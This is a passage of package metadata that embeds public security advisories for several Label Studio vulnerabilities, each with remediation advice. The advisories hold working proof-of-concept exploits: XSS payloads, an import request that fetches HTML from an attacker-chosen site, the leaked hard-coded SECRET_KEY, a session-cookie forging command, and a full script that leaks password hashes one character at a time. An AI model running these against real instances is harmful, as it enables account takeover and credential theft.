vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.9.0.post4":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.9.0.post4/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","click (~=7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (>=1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (>=4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq 